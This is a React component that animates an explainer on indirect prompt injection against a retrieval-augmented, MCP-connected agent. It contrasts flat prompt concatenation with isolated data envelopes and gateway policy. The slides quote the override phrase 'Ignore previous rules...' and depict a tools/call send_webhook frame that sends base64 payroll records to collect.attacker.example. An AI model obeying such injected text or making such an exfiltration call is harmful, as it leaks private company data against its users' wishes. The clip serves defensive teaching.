'use client';

import { useCallback } from 'react';
import gsap from 'gsap';
import { AnimeClipStage, type ClipTimelineApi } from '../../AnimeClipStage';
import { FilmBackdrop } from '../../FilmBackdrop';
import { clipPace } from '../../clipPace';

const FONT = 'ui-monospace, monospace';

const BEATS = [
  {
    id: 0,
    tag: '01',
    title: '0x000055E4A0100000 holds the flat prompt buffer where system rules and vendor text blend',
    story: 'In the left reading tray, crimson visitor notes sit jumbled directly inside the house rulebook pages.',
    technical: 'Unstructured concatenation lets hidden PDF directives hijack downstream tool-calling reasoning.',
  },
  {
    id: 1,
    tag: '02',
    title: '0x000055E4A0180000 captures the MCP tool-call JSON frame staging payroll records for egress',
    story: 'A bright amber dispatch slip prepares the locked payroll ledger for launch through the outdoor tube.',
    technical: 'JSON-RPC tools/call frame pairs read_internal_ledger output with attacker webhook destination.',
  },
  {
    id: 2,
    tag: '03',
    title: '0x000055E4A0240000 shows the isolated data envelope and MCP 403 policy rejection state',
    story: 'On the right tray, emerald glass partitions wall off the outside note and clamp the outdoor chute shut.',
    technical: 'Provenance tags + deterministic gateway policy deny unlisted egress while preserving benign summaries.',
  },
  {
    id: 3,
    tag: '04',
    title: 'Retaining structured prompt traces and MCP JSON-RPC audit logs enables rapid AI DFIR',
    story: 'Inspectors match the library tray record against the clamped chute bell to remove the tainted pamphlet.',
    technical: 'Correlate session_id, retrieved chunk_id, and MCP policy decisions to audit AI agent incidents end-to-end.',
  },
];

const CAMERAS = [
  { id: 'WIDE', transform: 'scale(1)' },
  { id: 'FLAT BUF', transform: 'scale(1.24) translate(105px, -20px)' },
  { id: 'MCP FRAME', transform: 'scale(1.26) translate(-10px, -20px)' },
  { id: 'ISOLATED', transform: 'scale(1.24) translate(-40px, -110px)' },
];

export function RagMcpMemoryCtxDiffClip() {
  const build = useCallback(({ root, setBeat }: ClipTimelineApi) => {
    const q = (sel: string) => root.querySelectorAll(sel);
    const tl = gsap.timeline();
    tl.set(q('.ragm-w1, .ragm-w2'), { strokeDasharray: 280, strokeDashoffset: 280 });
    tl.set(q('.ragm-mid, .ragm-right, .ragm-bar'), { autoAlpha: 0, y: 12 });

    tl.addLabel('b0').call(() => setBeat(0), [], 'b0');
    tl.to(q('.ragm-w1'), { strokeDashoffset: 0, duration: clipPace.travel, ease: 'none' }, 'b0');
    tl.to({}, { duration: clipPace.hold });

    tl.addLabel('b1').call(() => setBeat(1), [], 'b1');
    tl.to(q('.ragm-mid'), { autoAlpha: 1, y: 0, duration: clipPace.teach, ease: 'power2.out' }, 'b1');
    tl.to({}, { duration: clipPace.hold });

    tl.addLabel('b2').call(() => setBeat(2), [], 'b2');
    tl.to(q('.ragm-w2'), { strokeDashoffset: 0, duration: 0.7, ease: 'none' }, 'b2');
    tl.to(q('.ragm-right'), { autoAlpha: 1, y: 0, duration: clipPace.teach, ease: 'power2.out' }, 'b2+=0.35');
    tl.to({}, { duration: clipPace.hold });

    tl.addLabel('b3').call(() => setBeat(3), [], 'b3');
    tl.to(q('.ragm-bar'), { autoAlpha: 1, y: 0, duration: clipPace.teach, ease: 'power2.out' }, 'b3');
    tl.to({}, { duration: clipPace.end });
    return tl;
  }, []);

  return (
    <AnimeClipStage
      testId="technical-clip-ragmcp-memory"
      stageLabel="MEMORY"
      mitreId="T1190"
      beats={BEATS}
      cameras={CAMERAS}
      build={build}
    >
      <svg viewBox="0 0 1200 640" className="block h-full w-full" role="img" aria-label="LLM context buffer comparison between flat prompt concatenation and isolated MCP policy enforcement">
        <FilmBackdrop prefix="ragm" />
        <text x="28" y="30" fill="#94a3b8" fontSize="12" fontFamily={FONT} letterSpacing="0.12em">
          CONTEXT &amp; MCP TRACE DIFF · FLAT PROMPT INJECTION VS. ISOLATED DATA ENVELOPE
        </text>
        <text x="1172" y="30" textAnchor="end" fill="#64748b" fontSize="12" fontFamily={FONT}>
          AGENT HEAP · JSON-RPC AUDIT
        </text>

        <rect x="40" y="138" width="300" height="314" rx="14" fill="#1e293b" stroke="#f43f5e" strokeWidth="2.4" />
        <text x="190" y="172" textAnchor="middle" fill="#fda4af" fontSize="13" fontWeight="700" fontFamily={FONT}>0x000055E4A0100000</text>
        <text x="190" y="198" textAnchor="middle" fill="#f8fafc" fontSize="12" fontWeight="700" fontFamily={FONT}>Flat Prompt Buffer (RW-)</text>
        <rect x="62" y="222" width="256" height="98" rx="10" fill="#450a0a" stroke="#f43f5e" strokeWidth="1.8" />
        <text x="190" y="250" textAnchor="middle" fill="#fecaca" fontSize="11.5" fontWeight="700" fontFamily={FONT}>Rules + Chunk #8412 Mixed</text>
        <text x="190" y="276" textAnchor="middle" fill="#fde68a" fontSize="10.5" fontFamily={FONT}>&quot;Ignore previous rules...&quot;</text>
        <text x="190" y="298" textAnchor="middle" fill="#fca5a5" fontSize="10.5" fontFamily={FONT}>No Delimiter Or Trust Tag</text>
        <rect x="62" y="336" width="256" height="92" rx="10" fill="#0f172a" stroke="#64748b" strokeWidth="1.6" />
        <text x="190" y="366" textAnchor="middle" fill="#cbd5e1" fontSize="11.5" fontWeight="700" fontFamily={FONT}>Control Confusion</text>
        <text x="190" y="394" textAnchor="middle" fill="#94a3b8" fontSize="10.5" fontFamily={FONT}>Retrieved external text gains</text>
        <text x="190" y="414" textAnchor="middle" fill="#94a3b8" fontSize="10.5" fontFamily={FONT}>instruction-level authority</text>

        <line className="ragm-w1" x1="344" y1="295" x2="416" y2="295" stroke="#f59e0b" strokeWidth="4" />

        <g className="ragm-mid">
          <rect x="420" y="138" width="340" height="314" rx="16" fill="#0f172a" stroke="#f59e0b" strokeWidth="2.4" />
          <text x="590" y="172" textAnchor="middle" fill="#fde68a" fontSize="13" fontWeight="700" fontFamily={FONT}>0x000055E4A0180000</text>
          <text x="590" y="196" textAnchor="middle" fill="#e2e8f0" fontSize="11.5" fontFamily={FONT}>MCP JSON-RPC Dispatch Frame</text>
          <rect x="442" y="218" width="296" height="106" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
          <text x="590" y="246" textAnchor="middle" fill="#fef08a" fontSize="11.5" fontWeight="700" fontFamily={FONT}>tools/call: send_webhook</text>
          <text x="590" y="274" textAnchor="middle" fill="#fcd34d" fontSize="10.5" fontFamily={FONT}>url: collect.attacker.example</text>
          <text x="590" y="298" textAnchor="middle" fill="#fde68a" fontSize="10.5" fontFamily={FONT}>payload: payroll_q3 (Base64)</text>
          <rect x="442" y="340" width="296" height="88" rx="10" fill="#1e293b" stroke="#64748b" strokeWidth="1.6" />
          <text x="590" y="368" textAnchor="middle" fill="#cbd5e1" fontSize="11.5" fontWeight="700" fontFamily={FONT}>Unchecked Execution</text>
          <text x="590" y="394" textAnchor="middle" fill="#94a3b8" fontSize="10.5" fontFamily={FONT}>Exfil succeeds without gateway</text>
        </g>

        <line className="ragm-w2" x1="764" y1="295" x2="836" y2="295" stroke="#22c55e" strokeWidth="4" />

        <g className="ragm-right">
          <rect x="840" y="138" width="320" height="314" rx="16" fill="#1e293b" stroke="#22c55e" strokeWidth="2.4" />
          <text x="1000" y="172" textAnchor="middle" fill="#86efac" fontSize="13" fontWeight="700" fontFamily={FONT}>0x000055E4A0240000</text>
          <text x="1000" y="198" textAnchor="middle" fill="#f8fafc" fontSize="12" fontWeight="700" fontFamily={FONT}>Isolated + Policy Locked</text>
          <rect x="862" y="224" width="276" height="106" rx="10" fill="#052e16" stroke="#22c55e" strokeWidth="2" />
          <text x="1000" y="254" textAnchor="middle" fill="#bbf7d0" fontSize="11.5" fontWeight="700" fontFamily={FONT}>TAINTED_SESSION -&gt; 403</text>
          <text x="1000" y="282" textAnchor="middle" fill="#86efac" fontSize="10.5" fontFamily={FONT}>Untrusted Quote Tagged</text>
          <text x="1000" y="306" textAnchor="middle" fill="#cbd5e1" fontSize="10.5" fontFamily={FONT}>Egress Allowlist Enforced</text>
          <rect x="862" y="346" width="276" height="82" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="1.8" />
          <text x="1000" y="376" textAnchor="middle" fill="#7dd3fc" fontSize="11.5" fontWeight="700" fontFamily={FONT}>VERIFIED CONTAINED</text>
          <text x="1000" y="402" textAnchor="middle" fill="#cbd5e1" fontSize="10.5" fontFamily={FONT}>Full Audit Trail In SIEM</text>
        </g>

        <g className="ragm-bar">
          <rect x="110" y="504" width="980" height="88" rx="12" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2.4" />
          <text x="600" y="538" textAnchor="middle" fill="#e0e7ff" fontSize="14" fontWeight="700" fontFamily={FONT}>
            AGENT TAKEAWAY: Pair isolated untrusted-data envelopes with deterministic MCP gateway policies and logging
          </text>
          <text x="600" y="566" textAnchor="middle" fill="#fde68a" fontSize="12" fontFamily={FONT}>
            Correlating RAG chunk IDs with denied MCP JSON-RPC calls enables rapid quarantine of poisoned knowledge docs
          </text>
        </g>
      </svg>
    </AnimeClipStage>
  );
}
